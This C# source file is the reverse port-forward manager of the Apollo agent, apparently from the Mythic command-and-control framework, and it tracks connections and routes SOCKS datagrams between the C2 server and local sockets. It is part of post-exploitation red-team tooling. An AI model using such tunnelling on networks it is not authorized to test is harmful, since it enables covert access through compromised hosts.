using AI = ApolloInterop;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Collections.Concurrent;
using System.Net.Sockets;
using System;
using ApolloInterop.Utils;
using System.Xml.Linq;
using ApolloInterop.Classes;

namespace Apollo.Management.Rpfwd
{
    public class RpfwdManager : AI.Classes.RpfwdManager
    {
        private ConcurrentDictionary<int, RpfwdClient> _connections = new ConcurrentDictionary<int, RpfwdClient>();
        
        public RpfwdManager(IAgent agent) : base(agent)
        {

        }
        public override bool AddConnection(TcpClient client, int ServerID, int Port, int debugLevel, Tasking task)
        {
            RpfwdClient c = new RpfwdClient(_agent, client, ServerID, Port, debugLevel, task);
            _connections.AddOrUpdate(c.ID, c, (int i, RpfwdClient d) => { return d; });
            DebugHelp.DebugWriteLine($"added new connection to RpfwdManager _connections: {ServerID}");
            c.Start();
            return true;
        }

        public override bool Route(SocksDatagram dg)
        {
            // we'll never get notification of a new client from the server, we will always identify new clients
            DebugHelp.DebugWriteLine($"routing datagram: {dg.ServerID}");
            if (!_connections.ContainsKey(dg.ServerID))
            {
                // this means we got a message for something that's already exited on our end
                if (!dg.Exit)
                {
                    // it is exited on our end, but Mythic isn't trying to tell us to exit, so we need to inform it to close the connection
                    return dg.Exit;
                }
                // we don't have the id, but Mythic is trying to tell us to close the id, so just drop the packet
                return false;
                   // RpfwdClient c = new RpfwdClient(_agent, dg.ServerID);
                    //_connections.AddOrUpdate(c.ID, c, (int i, RpfwdClient d) => { return d; });
            }
            var handleRet = _connections[dg.ServerID].HandleDatagram(dg);
            if (dg.Exit)
            {
                // we do have the connection tracked and the Mythic server is telling us its closed on their end, so close here and exit
                _connections[dg.ServerID].Exit();
                return dg.Exit;
            }
            return handleRet;
        }

        public override bool Remove(int id)
        {
            _connections[id].Exit();
            return _connections.TryRemove(id, out RpfwdClient _);
        }
    }
}
